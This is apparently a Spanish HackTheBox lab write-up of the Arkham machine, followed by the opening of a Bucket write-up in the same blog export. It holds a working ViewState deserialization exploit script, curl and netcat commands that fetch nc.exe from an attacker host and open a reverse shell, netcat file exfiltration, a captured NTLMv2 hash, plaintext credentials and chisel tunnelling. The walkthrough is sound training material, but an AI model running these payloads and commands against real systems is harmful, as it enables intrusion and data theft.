‚îú‚îÄ‚îÄ robin. jpeg  ‚îî‚îÄ‚îÄ tomcat-stuff    ‚îú‚îÄ‚îÄ context. xml    ‚îú‚îÄ‚îÄ faces-config. xml    ‚îú‚îÄ‚îÄ jaspic-providers. xml    ‚îú‚îÄ‚îÄ MANIFEST. MF    ‚îú‚îÄ‚îÄ server. xml    ‚îú‚îÄ‚îÄ tomcat-users. xml    ‚îú‚îÄ‚îÄ web. xml    ‚îî‚îÄ‚îÄ web. xml. bak4 directories, 13 filesLo interesante lo tenemos en el directorio Mask/tomcat-stuff/, de primeras podr√≠amos ir directamente al archivo tomcat-users. xml que a veces contienen credenciales de usuarios tomcat, pero esta vez no hay nada √∫til‚Ä¶ Para trabajar un poco m√°s r√°pido, copiamos la carpeta Mask/ al equipo y la desmontamos del sistema: ‚ù≠ umount /mntVisitando los archivos de *tomcat**, vemos otro llamativo a la vista, web. xml. bak, pero no podemos hacer nada con √©l ni con los otros, as√≠ que üòê ‚Ä¶ Puerto 8080 (Proxy) ‚åñ: Opa, un servicio web con info, el √∫nico recurso funcional es Subscription que nos redirecciona a: A primera vista no hay nada interesante, pero si nos vamos al c√≥digo fuente tenemos: . . . &lt;form id= j_id_jsp_1623871077_1  name= j_id_jsp_1623871077_1  method= post  action= /userSubscribe. faces  enctype= application/x-www-form-urlencoded &gt; &lt;table&gt;  &lt;tbody&gt;   &lt;tr&gt;    &lt;td&gt;     &lt;input id= j_id_jsp_1623871077_1:email  name= j_id_jsp_1623871077_1:email  type= text  value=   style= margin-left:50px;  class= button  /&gt;    &lt;/td&gt;   &lt;/tr&gt;  &lt;/tbody&gt; &lt;/table&gt; &lt;input id= j_id_jsp_1623871077_1:submit  name= j_id_jsp_1623871077_1:submit  type= submit  value= SIGN UP  style= cursor: pointer  class= button  /&gt; &lt;input type= hidden  name= j_id_jsp_1623871077_1_SUBMIT  value= 1  /&gt; &lt;input type= hidden  name= javax. faces. ViewState  id= javax. faces. ViewState  value= wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=  /&gt;&lt;/form&gt;. . . Tenemos campos escondidos y uno que juega con el componente javax. faces‚Ä¶ Pues buscando en internet sobre √©l, tenemos que es un framework de Java (JavaServer Faces) usado para generar aplicaciones basadas en interfaces de usuario (UI).  Introducci√≥n a JavaServer Faces.  JavaServer Faces - Wikipedia. Bien, el campo juguet√≥n es medio extra√±o, indagando sobre javax. faces exploit encontramos recursos interesantes:  How i found a 1500$ worth Deserialization vulnerability.  Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities.  Java JSF ViewState (. faces) Deserialization. Y si, efectivamente, varios recursos hablando sobre vulnerabilidades de deserializacion (que tanto me gustan), as√≠ que definamos r√°pidamente que es eso de ‚Äúdeserializacion‚Äù:  En pocas palabras (pocas realmente, hechenle un ojo por su parte, es super interesante). La deserializacion es convertir un conjunto de bytes que viajan por la red a un unico objeto. (La serializacion seria lo contrario). Sencillito no? El problema surge cuando no est√°n bien configurados los servicios o no se valida el contenido de lo que viaja al crear un objeto, lo que nos permite aprovecharnos del proceso, ya que mientras se genera el objeto podemos inyectar cositas en la mitad. Lo m√°s probable es que el proceso nos d√© un error (ya que estamos modificando el objeto por lo tanto su estructura) pero no nos interesara, porque el proceso fallo precisamente despu√©s de haber le√≠do nuestras instrucciones inyectadas, por lo tanto si todo va bien, las habr√° ejecutado ;) (Es un lindo tema)  Deserialization Cheat Sheet.  Insecure deserialization.  Serialization and deserialization in Java. ‚Ä¶ Explotaci√≥n #: Listo, indagando espec√≠ficamente en los recursos encontrados sobre javax. faces exploit hablan del campo javax. faces. ViewState que se encarga de guardar el estado actual de la sesi√≥n, por ejemplo para indicarle al servidor que partes de la web deber√≠amos ver. El campo puede ser manejado desde el servidor y el cliente y es enviado de vuelta una vez el formulario (en nuestro caso) sea generado. Por lo general se implementan en dos procesos:  Oracle Mojarra (JSF reference implementation).  Apache MyFaces. Bien, si seguimos indagando vemos que el campo contiene data serializada :O Opa, empieza a tomar sentido‚Ä¶ Ahora, vimos que se puede implementar en dos procesos, nos enfocaremos en el segundo, Apache MyFaces. Pero ¬øpor qu√©? Vale, recordemos el archivo web. xml. bak, en los art√≠culos referencian un campo del archivo llamado javax. faces. STATE_SAVING_METHOD el cual puede tener o server o client (lo que hablamos antes): ‚ù≠ cat web. xml. bak | grep SAVING -A 1&lt;param-name&gt;javax. faces. STATE_SAVING_METHOD&lt;/param-name&gt;&lt;param-value&gt;server&lt;/param-value&gt;Como en nuestro caso tenemos server y en las referencias indican que para tener un vector de ataque satisfactorio debemos contar con:  Campo ViewState desencriptado (por lo que si hacemos un base64 -d deberiamos ver un formato Java). In case of Mojarra: ViewState configured to reside on the client. In case of MyFaces: ViewState configured to reside on the client or the server. Por lo tanto descartamos a Mojarra :) ‚Ä¶  ViewState - Apache MyFaces. Entonces, veamos que contiene la cadena en base64: ‚ù≠ echo  wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=  | base64 -dz4b#-F!e)x8~r\LE        S. IB9aH;“Å^gOTfeLY pues no :P Asi que podemos entender que esta encriptado :( Peeeeeeeeeeeeeeeeeeero, sabemos que contamos (presuntamente) con una vulnerabilidad de deserializacion ante ese campo, yyyyyyyyyyy si volvemos al archivo web. xml. bak vemos otra cadena en base64 pero hacienod referencia a un secreto y cositas de encriptacion: &lt;param-name&gt;org. apache. myfaces. SECRET&lt;/param-name&gt;&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;&lt;/context-param&gt;  &lt;context-param&gt;    &lt;param-name&gt;org. apache. myfaces. MAC_ALGORITHM&lt;/param-name&gt;    &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;   &lt;/context-param&gt;&lt;context-param&gt;&lt;param-name&gt;org. apache. myfaces. MAC_SECRET&lt;/param-name&gt;&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;. . . ‚ù≠ echo  SnNGOTg3Ni0=  | base64 -dJsF9876-Parece insignificante, pero si volvemos al art√≠culo al final hay un script que usa una llave (curiosamente la misma) para convertir payloads normalitos y feitos a payloads firmados con la llave :) Pues nada, ahora nos queda crear los payloads, nos podemos apoyar de ysoserial que ayuda a generar payloads que explotan vulnerabilidades de deserializaci√≥n en Java: Descargamos el binario y ejecutamos para ver todos los tipos de payload que podemos usar: Uff varios, lo mejor ser√° crear un script para generar los payloads y que al mismo tiempo haga las peticiones web hacia el campo ‚Äúvulnerable‚Äù a ver si logramos explotar alguna deserializacion‚Ä¶ Extraemos el nombre de cada payload para generar un array despu√©s: ‚ù≠ curl -s https://github. com/frohoff/ysoserial | grep Payload -A 35 | awk '{print $1}' | tail -n 34 &gt; payloadsYSO# O tambien asi:‚ù≠ wget https://github. com/frohoff/ysoserial‚ù≠ cat ysoserial | grep Payload -A 35 | awk '{print $1}' | tail -n 34 &gt; payloadsYSOYa tendr√≠amos los payloads, d√©mosle el formato de array: ‚ù≠ for i in $(cat payloadsYSO); do echo -n  '$i', ; done'AspectJWeaver','BeanShell1','C3P0','Click1','Clojure','CommonsBeanutils1','CommonsCollections1','CommonsCollections2','CommonsCollections3','CommonsCollections4','CommonsCollections5','CommonsCollections6','CommonsCollections7','FileUpload1','Groovy1','Hibernate1','Hibernate2','JBossInterceptors1','JRMPClient','JRMPListener','JSON1','JavassistWeld1','Jdk7u21','Jython1','MozillaRhino1','MozillaRhino2','Myfaces1','Myfaces2','ROME','Spring1','Spring2','URLDNS','Vaadin1','Wicket1',Listo, ahora si los tenemos, despu√©s de un rato probando cositas creamos este script: #!/usr/bin/python3import hashlib, hmacimport requestsimport base64import timeimport osfrom pyDes import *payloads = [  'AspectJWeaver','BeanShell1','C3P0','Click1','Clojure','CommonsBeanutils1','CommonsCollections1','CommonsCollections2','CommonsCollections3',  'CommonsCollections4','CommonsCollections5','CommonsCollections6','CommonsCollections7','FileUpload1','Groovy1','Hibernate1','Hibernate2',  'JBossInterceptors1','JRMPClient','JRMPListener','JSON1','JavassistWeld1','Jdk7u21','Jython1','MozillaRhino1','MozillaRhino2','Myfaces1',  'Myfaces2','ROME','Spring1','Spring2','URLDNS','Vaadin1','Wicket1']# Firmamos el payload# * https://book. hacktricks. xyz/pentesting-web/deserialization/java-jsf-viewstate-. faces-deserialization#custom-encryptiondef encrypt(payload,key):  cipher = des(key, ECB, IV=None, pad=None, padmode=PAD_PKCS5)  enc_payload = cipher. encrypt(payload)  return enc_payloaddef hmac_siga(enc_payload,key):  hmac_sig = hmac. new(key, enc_payload, hashlib. sha1)  hmac_sig = hmac_sig. digest()  return hmac_sigurl =  http://10. 10. 10. 130:8080 key = b'JsF9876-'def sign_payload(cmd):  '''  Ejecutar comandos en el sistema y jugar con el output  * https://python-para-impacientes. blogspot. com/2014/02/ejecutar-un-comando-externo. html  '''  for payload in payloads:    print( Enviando   + payload)    # Generamos payload    # https://stackoverflow. com/questions/42339876/error-unicodedecodeerror-utf-8-codec-cant-decode-byte-0xff-in-position-0-in    os. system('java -jar ysoserial. jar %s  %s  &gt; %s. txt' % (payload, cmd, payload))    payload_file = open('. /' + payload + '. txt', 'rb')    # Firmamos payload    enc_payload = encrypt(payload_file. read(),key)    hmac_sig = hmac_siga(enc_payload,key)    # Pasamos a base64    final_payload = base64. b64encode(enc_payload + hmac_sig)    payload_file. close()    data_post = {       j_id_jsp_1623871077_1:email  :  aaaaaaaaa ,        j_id_jsp_1623871077_1:submit  :  SIGN UP ,       j_id_jsp_1623871077_1_SUBMIT  :  1 ,       javax. faces. ViewState  : final_payload    }    session = requests. Session()    r = session. post(url + '/userSubscribe. faces', data=data_post)    # Borramos los archivos creados de cada payload (por un problema tuve que hacerlo asi).     os. system( shred -zun 10 %s. txt  % (payload))# Enviamos el comandosign_payload( ping -n 1 10. 10. 14. 14 )Entonces generamos el payload, que dentro de √©l va a tener el comando ping -n 1 10. 10. 14. 14, por lo tanto si se ejecuta deber√≠amos recibir una petici√≥n ICMP hacia nuestra m√°quina. Pong√°monos en escucha para ver que llega hacia el protocolo ICMP en la red: ‚ù≠ tshark -i tun0 -Y  icmp  2&gt;/dev/nullHagamos un ejemplo r√°pido de lo que hace el script: 1. Generamos payload. ‚ù≠ java -jar ysoserial. jar Click1 'ping -n 1 10. 10. 14. 14' &gt; clickpayload. txt‚ù≠ strings clickpayload. txtjava. util. PriorityQueuesizeL. . . ‚ù≠ file clickpayload. txt clickpayload. txt: Java serialization data, version 52. Firmamos el payload. 3. Convertimos el payload a base64 para pas√°rselo al campo ViewState. ‚ù≠ cat clickpayload. txt | base64 | tr -d '\n'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4Kx. . . 4. Enviamos la petici√≥n :P ‚Ä¶ Listo, pues ejecutando el script y estando atentos tenemos respuesta cuando llega a estos payloads: ‚ù≠ python3 validatePayload. py. . . Enviando CommonsCollections5Enviando CommonsCollections6Enviando CommonsCollections7. . .  Bien, pues borrando la mayor√≠a de payloads y qued√°ndonos con los cercanos a estos tres podemos validar realmente que tenemos ejecuci√≥n de comandos remotamenteeeeeeeeeeeeeeeeeeeeeee :D Listoooooooo, generemos una Reverse Shell. Pong√°monos en escucha con netcat, nc -lvp 4433. Intentando con PowerShell (y sus variaciones), con certutil y finalmente con cURL subir el binario nc. exe, logramos con este √∫ltimo recibir las 3 peticiones en nuestro servidor web: . . . sign_payload( curl http://10. 10. 14. 14:8000/nc. exe -o C:\\Windows\\Temp\\nc. exe' )‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . 10. 10. 10. 130 - - [26/Apr/2021 25:25:25]  GET /nc. exe HTTP/1. 1  200 -10. 10. 10. 130 - - [26/Apr/2021 25:25:25]  GET /nc. exe HTTP/1. 1  200 -10. 10. 10. 130 - - [26/Apr/2021 25:25:25]  GET /nc. exe HTTP/1. 1  200 -Pero al generar la reverse shell: . . . sign_payload( C:\\Windows\\Temp\\nc. exe 10. 10. 14. 14 4433 -e cmd. exe )No pasa nada :( Asi que probablemente la ruta en la que estemos subiendo el archivo no exista. A jugar y probar cositas‚Ä¶  Where Does Windows Store Temporary Files and How to Change TEMP Folder Location?. Siguiendo la gu√≠a citada, vemos que la ruta anterior tambi√©n puede encontrarse como TEMP/, as√≠ que probemos: . . . sign_payload( curl http://10. 10. 14. 14:8000/nc. exe -o C:\\Windows\\TEMP\\nc. exe' )sign_payload( C:\\Windows\\TEMP\\nc. exe 10. 10. 14. 14 4433 -e cmd. exe )Recibimos petici√≥n y en nuestro listeneeeeeer: Listooooones, a darleeeeeeeeeeeeeeeeee!! ‚Ä¶ Movimiento lateral : Alfred -&gt; Batman #: Enumerando un poco sobre el directorio C:\Users vemos: c:\Users&gt;dir Volume in drive C has no label. Volume Serial Number is FA90-3873 Directory of c:\Users02/03/2019 06:54 PM  &lt;DIR&gt;     . 02/03/2019 06:54 PM  &lt;DIR&gt;     . . 02/03/2019 09:26 AM  &lt;DIR&gt;     Administrator02/03/2019 06:31 PM  &lt;DIR&gt;     Alfred02/02/2019 10:48 AM  &lt;DIR&gt;     Batman02/03/2019 06:54 PM  &lt;DIR&gt;     Guest02/01/2019 08:19 AM  &lt;DIR&gt;     Public        0 File(s)       0 bytes        7 Dir(s)  8,718,667,776 bytes freec:\Users&gt;Profundizando en el directorio C:\Users\Alfred encontramos un archivo . zip: c:\Users\Alfred\Downloads\backups&gt;dir Volume in drive C has no label. Volume Serial Number is FA90-3873 Directory of c:\Users\Alfred\Downloads\backups04/27/2021 10:24 PM  &lt;DIR&gt;     . 04/27/2021 10:24 PM  &lt;DIR&gt;     . . 02/03/2019 08:41 AM      124,257 backup. zip        1 File(s)    124,257 bytes        2 Dir(s)  8,722,964,480 bytes freec:\Users\Alfred\Downloads\backups&gt;Mov√°moslo a nuestra m√°quina, probando mediante una carpeta compartida con SMB: ‚ù≠ smbserver. py smbFolder $(pwd) -smb2supportImpacket v0. 9. 22. dev1+20200909. 150738. 15f3df26 - Copyright 2020 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3. 0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1. 0[*] Config file parsed[*] Config file parsed[*] Config file parsedObtenemos: c:\Users\Alfred\Downloads\backups&gt;copy backup. zip \\10. 10. 14. 14\smbFolder\backup. zipYou can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.     0 file(s) copied. c:\Users\Alfred\Downloads\backups&gt;Y en el servidor SMB recibimos el hash Net-NTLMv2 del usuario Alfred, pero intentando crackearlo no logramos nada :( . . . [*] Incoming connection (10. 10. 10. 130,49707)[*] AUTHENTICATE_MESSAGE (ARKHAM\Alfred,ARKHAM)[*] User ARKHAM\Alfred authenticated successfully[*] Alfred::ARKHAM:aaaaaaaa:7788c08b972d046d3204856b5e605c9c:010100000000000080a2169c763ad701bdc49d05e3f6764400000000010010007a0072006e00520070007200720041000200100062007a0069004c0049004d004e004f00030010007a0072006e00520070007200720041000400100062007a0069004c0049004d004e004f000700080080a2169c763ad70106000400020000000800300030000000000000000000000000200000501679800e3ec4fec38e468143ba78a69d3112f8176260dbae0bf0d0fce82c1d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000[*] Closing down connection (10. 10. 10. 130,49707). . . Despu√©s recordamos una manera mediante netcat, aprovechando que ya lo subimos podemos ejecutar el proceso. Nos ponemos en escucha y guardamos el output en un archivo llamado backup. zip: ‚ù≠ nc -lvp 4434 &gt; backup. ziplistening on [any] 4434 . . . Y en la m√°quina Windows indicamos que lea el contenido del archivo backup. zip, espere 5 segundos como m√°ximo y env√≠e el resultado a nuestro listener: c:\Users\Alfred\Downloads\backups&gt;C:\\Windows\\TEMP\\nc. exe -w 5 10. 10. 14. 14 4434 &lt; backup. zipRecibimos: ‚ù≠ nc -lvp 4434 &gt; backup. ziplistening on [any] 4434 . . . 10. 10. 10. 130: inverse host lookup failed: Host name lookup failureconnect to [10. 10. 14. 14] from (UNKNOWN) [10. 10. 10. 130] 49743Y validando: ‚ù≠ ls backup. zipBien, veamos que contiene: ‚ù≠ unzip backup. zipArchive: backup. zip inflating: alfred@arkham. local. ost Offline Outlook Data File (. ost) file is used to store a synchronized copy of your mailbox information on your local computer. Offline Outlook Data File (. ost). Opa, entonces tenemos los directorios de un correo (en este caso de alfred) üòÆ Bien pues buscando en internet encontramos la herramienta readpst para convertir este tipo de archivos un formato distinto, por default a un archivo . mbox: ‚ù≠ readpst alfred@arkham. local. ostOpening PST file and indexes. . . Processing Folder  Deleted Items Processing Folder  Inbox Processing Folder  Outbox Processing Folder  Sent Items Processing Folder  Calendar Processing Folder  Contacts Processing Folder  Conversation Action Settings Processing Folder  Drafts Processing Folder  Journal Processing Folder  Junk E-Mail Processing Folder  Notes Processing Folder  Tasks Processing Folder  Sync Issues Processing Folder  RSS Feeds Processing Folder  Quick Step Settings      alfred@arkham. local. ost  - 15 items done, 0 items skipped.      Calendar  - 0 items done, 3 items skipped. Processing Folder  Conflicts Processing Folder  Local Failures Processing Folder  Server Failures      Sync Issues  - 3 items done, 0 items skipped.      Drafts  - 1 items done, 0 items skipped.      Inbox  - 0 items done, 7 items skipped. Si enfocamos la vista, vemos que simplemente recupero contenido de un ‚Äúfolder‚Äù llamado Server Failures -&gt; Drafts, si validamos tenemos efectivamente un archivo llamado Drafts. mbox: ‚ù≠ lsalfred@arkham. local. ost backup. zip Drafts. mboxLeyendo el archivo normalmente, vemos varias cositas: . . . From  MAILER-DAEMON  Thu Jan 1 00:00:00 1970From: &lt;MAILER-DAEMON&gt;Subject: To: batman. . . Opa, vemos un mensaje hacia Wayne (Batman) para que deje de olvidarse de su contrase√±a y adjunto lleva una imagen en formato Base64. Entonces tomando el contenido encodeado y copi√°ndolo a un archivo que llamaremos base64. txt para posteriormente decodearlo (cat base64. txt | base64 -d &gt; loquesea. png) y guardar el output en uno llamado loquesea. png tendr√≠amos finalmente: OHHH, unas credenciales de un usuario llamado batman, si recordamos, antes vimos que entre los usuarios del sistema tenemos uno llamado Batman, as√≠ que copi√©monos la contrase√±a: Batman : Zx^#QZX+T!123Valid√°ndola borrando un n√∫mero y despu√©s completa tenemos: ‚ù≠ crackmapexec smb 10. 10. 10. 130 -u Batman -p 'Zx^#QZX+T!12'SMB     10. 10. 10. 130  445  ARKHAM      [*] Windows 10. 0 Build 17763 x64 (name:ARKHAM) (domain:ARKHAM) (signing:False) (SMBv1:False)SMB     10. 10. 10. 130  445  ARKHAM      [-] ARKHAM\Batman:Zx^#QZX+T!12 STATUS_LOGON_FAILUREY ahora bien: ‚ù≠ crackmapexec smb 10. 10. 10. 130 -u Batman -p 'Zx^#QZX+T!123'SMB     10. 10. 10. 130  445  ARKHAM      [*] Windows 10. 0 Build 17763 x64 (name:ARKHAM) (domain:ARKHAM) (signing:False) (SMBv1:False)SMB     10. 10. 10. 130  445  ARKHAM      [+] ARKHAM\Batman:Zx^#QZX+T!123Perfecto, son v√°lidas :) Pero validando con psexec, con wmiexec y con crackmapexec no logramos obtener una Shell como Batman. Enumerando los servicios corriendo en la m√°quina internamente tenemos uno interesante, ¬ølo ves?: c:\Users\Alfred\Videos&gt;netstat -anetstat -aActive Connections Proto Local Address     Foreign Address    State TCP  0. 0. 0. 0:80       ARKHAM:0        LISTENING TCP  0. 0. 0. 0:135      ARKHAM:0        LISTENING TCP  0. 0. 0. 0:445      ARKHAM:0        LISTENING TCP  0. 0. 0. 0:5985      ARKHAM:0        LISTENING TCP  0. 0. 0. 0:8009      ARKHAM:0        LISTENING TCP  0. 0. 0. 0:8080      ARKHAM:0        LISTENING TCP  0. 0. 0. 0:47001     ARKHAM:0        LISTENING TCP  0. 0. 0. 0:49664     ARKHAM:0        LISTENING TCP  0. 0. 0. 0:49665     ARKHAM:0        LISTENING TCP  0. 0. 0. 0:49666     ARKHAM:0        LISTENING TCP  0. 0. 0. 0:49667     ARKHAM:0        LISTENING TCP  0. 0. 0. 0:49668     ARKHAM:0        LISTENING TCP  0. 0. 0. 0:49669     ARKHAM:0        LISTENING. . . Efectivamente, tenemos el puerto 5985 que generalmente sirve el servicio WinRM (Windows Remote Management) el cual entre muchas cosas brinda una interfaz de comandos para realizar tareas de administraci√≥n en el sistema. Hay una utilidad conocida y muy linda llamada evil-winrm que explota el servicio para proveer una PowerShell completamente interactiva. Pero no podemos usarla as√≠ de la nada, ya que el puerto est√° sirviendo, pero internamente, entonces juguemos con chisel para generar un Remote Port Forwarding, permitiendo as√≠ que el puerto 5985 de la m√°quina 10. 10. 10. 130 (internamente 127. 0. 0. 1) se convierta en un puerto cualquiera de nuestra m√°quina atacante (10. 10. 14. 14), entonces podremos acceder al puerto desde nuestro sistema y lograr ejecutar evil-winrm.  Explicaci√≥n tipos de reenvios de puertos (port forwarding) mediante SSH. (Quedense con las definiciones :P). Remote Port Forwarding: Subamos el binario chisel a la m√°quina Windows:  Descargamos el comprimido para Windows: chisel_1. 7. 6_windows_amd64. gz.  Descomprimimos y cambiamos nombre a uno m√°s sencillo. exe :P Descargamos el comprimido para Linux: chisel_1. 7. 6_linux_amd64. gz.  Descomprimimos y cambiamos nombre a otro m√°s sencillo :) Subimos el binario . exe a la m√°quina: powershell IWR -uri http://10. 10. 14. 14:8000/chisel. exe -OutFile chisel. exe.  Validamos que la version de los dos binarios sea la misma simplemente ejecutandolos: Version: 1. 7. 6 (go1. 16rc1). Ahora, le indicamos a nuestra m√°quina atacante que levante el puerto 5988 (que sera el que reciba el Port Fortwarding) y actue como servidor (listener) mediante chisel: ‚ù≠ . /chisel server -p 5988 --reverse2021/04/26 05:50:07 server: Reverse tunnelling enabled2021/04/26 05:50:07 server: Fingerprint hZ7G/q+Y+FZ0cm+H0AlBa9rOHdjlYpb59JtMBGs13eQ=2021/04/26 05:50:07 server: Listening on http://0. 0. 0. 0:5988Tamo, ahora vamos al cliente e indicamos que tome el puerto 5985 y reenvie su trafico al puerto 5988 de la m√°quina 10. 10. 14. 14 que simula realmente el puerto 5985 del localhost: c:\Users\Alfred\Videos&gt;chisel. exe client 10. 10. 14. 14:5988 R:5985:localhost:5985chisel. exe client 10. 10. 14. 14:5988 R:5985:localhost:59852021/04/28 00:42:05 client: Connecting to ws://10. 10. 14. 14:59882021/04/28 00:42:07 client: Connected (Latency 200. 7885ms)Recibimos en el servidor: . . . 2021/04/26 25:25:25 server: session#1: tun: proxy#R:5985=&gt;localhost:5985: ListeningValidando el contenido del puerto 5988 vemos: ‚ù≠ lsof -i:5988COMMAND   PID USER  FD  TYPE DEVICE SIZE/OFF NODE NAMEchisel 1050047 root  6u IPv6 4641412   0t0 TCP *:5988 (LISTEN)chisel 1050047 root  7u IPv6 4642498   0t0 TCP 10. 10. 14. 14:5988-&gt;10. 10. 10. 130:49772 (ESTABLISHED)‚ù≠ lsof -i:5985COMMAND   PID USER  FD  TYPE DEVICE SIZE/OFF NODE NAMEchisel 1050047 root  8u IPv6 4642501   0t0 TCP *:5985 (LISTEN)Bien, ahora probemos conectarnos mediante evil-winrm con las credenciales que tenemos:  Toma por defecto el puerto 5985, y pues como hay un redireccionamiento actual hacia ese puerto de nuestra m√°quina, no debemos indicarselo ;)‚ù≠ evil-winrm -i localhost -u 'Batman' -p 'Zx^#QZX+T!123' Perfecto, tenemos una PowerShell como el usuario batman en el sistema :O Sigamos jugando‚Ä¶ ‚Ä¶ Escalada de privilegios #: Si vemos los grupos con los que cuenta Batman, tenemos que en teoria somos administradores: *Evil-WinRM* PS C:\Users&gt; net user BatmanUser name          BatmanFull NameCommentUser's commentCountry/region code     001 (United States)Account active        YesAccount expires       NeverPassword last set      2/3/2019 9:25:50 AMPassword expires       NeverPassword changeable     2/3/2019 9:25:50 AMPassword required      YesUser may change password   YesWorkstations allowed     AllLogon scriptUser profileHome directoryLast logon          4/27/2021 9:00:34 PMLogon hours allowed     AllLocal Group Memberships   *Administrators    *Remote Management Use               *UsersGlobal Group memberships   *NoneThe command completed successfully. Por lo que podriamos ver el contenido de la flag, pero no :( Adem√°s si vemos nuestros permisos claramente nos damos cuenta que no somos admins aun: *Evil-WinRM* PS C:\Users&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name        Description          State============================= ============================== =======SeChangeNotifyPrivilege    Bypass traverse checking    EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledJugando un rato a ver por que metodo podriamos romper esto, recordamos algo. En la imagen donde estaban las credenciales de Batman habia un comando para entrar a un recurso llamado gotham‚Ä¶ Y si modificamos esa linea pero para ingresar al directorio C:\ del sistema? Pues buscando info, llegamos a este recurso:  How to access C$ share in a network?. Nos interesa el cuarto paso, que juntandolo con este articulo quedaria asi la linea: *Evil-WinRM* PS C:\Users&gt; net use G: \\ARKHAM\C$The command completed successfully. *Evil-WinRM* PS C:\Users&gt; cd G:\*Evil-WinRM* PS G:\&gt; Entonces, montamos el directorio C:\ en un directorio compartido llamado G:\ y nos permite ver las flags: Listones. Igual entiendo que debe existir otra manera para obtener una shell con todos los permisos, pero despues de un rato no encontre como hacerlo :( Intentar√© ver como cambiar nuestros permisos a unos de full admin, pero mientras tanto subo todo el proceso para llegar hasta aqui, relativamente somos admins ;) ‚Ä¶ Ufff vaya m√°quina eh! Por momentos me parecia que estaba ante una m√°quina nivel Hard, pero fue interesante, todos los ataques de deserializacion me encantan, asi que disfute mucho esa parte :) Y bueno, aaaaaaaaaaaaaaa calmarnos y a tomarnos un vasito de agua, pero sin dejar de pensar en romper todo! Nos vemos, gracias por leer. "
    }, {
    "id": 54,
    "url": "http://localhost:4000/htb/bucket",
    "title": "HackTheBox - Bucket",
    "body": "2021/04/23 - M√°quina Linux nivel medio, jugaremos mucho con AWS, leeremos c√≥digo fuente y descubriremos que podemos leer archivos como root. Esto mediante el juego entre la herramienta PD4ML y AWS DynamoDB.  TL;DR (Spanish writeup): Creada por: MrR3boot. Bueno bueno, nos estrellaremos contra el servicio AWS S3, que nos permite (entre otras cosas) mediante buckets almacenar informaci√≥n en las nubes :P Tendremos que jugar con su API para obtener informaci√≥n de como subir un archivo al bucket‚Ä¶ Despu√©s de muchas vueltas lograremos subir un archivo que nos permite obtener una reverse Shell, siendo r√°pidos lograremos la sesi√≥n como el usuario www-data. En la enumeraci√≥n previa, obtuvimos otro servicio corriendo mediante AWS, en este caso el motor de base de datos NoSQL DynamoDB. Jugando tambi√©n con la API obtendremos la base de datos users y varias credenciales‚Ä¶ Estando dentro de la m√°quina veremos al usuario roy, usando las credenciales encontradas lograremos migrarnos a su sesi√≥n. Finalmente nos encontraremos un archivo index. php algo curioso, nos fijaremos en su cabecera y tendremos un proceso que involucra DynamoDB y PD4ML (b√°sicamente convierte un archivo en otro con formato . PDF). En el c√≥digo llama una tabla (que no existe) y guarda su data en un objeto que posteriormente lo convierte en PDF. Todo esto ejecutado como usuario administrador del sistema (root). As√≠ que aprovecharemos esta locura para obtener la llave privada (id_rsa) del usuario root e ingresar a la m√°quina. Clasificaci√≥n de la m√°quina: Jmmm, no son vulnerabilidades conocidas, pero pueden llegar a ser reales, pero claro, debemos mover algunas tuercas para que funcione.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ Fases üôÑ  Enumeraci√≥n.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Empezamos realizando un escaneo de puertos sobre la m√°quina para conocer que servicios esta corriendo. ‚Äì¬ª nmap -p- --open -v 10. 10. 10. 212 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚Äì¬ª cat initScan # Nmap 7. 80 scan initiated Wed Dec 23 25:25:25 2020 as: nmap -p- --open -v -oG initScan 10. 10. 10. 212# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 212 ()  Status: UpHost: 10. 10. 10. 212 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///# Nmap done at Wed Dec 23 25:25:25 2020 -- 1 IP address (1 host up) scanned in 95. 68 secondsMuy bien, ¬øque tenemos?       Puerto   Descripci√≥n         22   SSH: Conexion remota segura mediante una shell.        80   HTTP: Comunicaci√≥n que permite las transferencias de informaci√≥n a trav√©s de archivos en internet.    Realizemos un escaneo en base a scripts y versiones sobre cada puerto, con ello obtenemos informacion mas detallada de cada servicio: ‚Äì¬ª nmap -p 22,80 -sC -sV 10. 10. 10. 212 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚Äì¬ª cat portScan # Nmap 7. 80 scan initiated Wed Dec 23 25:25:25 2020 as: nmap -p 22,80 -sC -sV -oN portScan 10. 10. 10. 212Nmap scan report for 10. 10. 10. 212Host is up (0. 19s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 8. 2p1 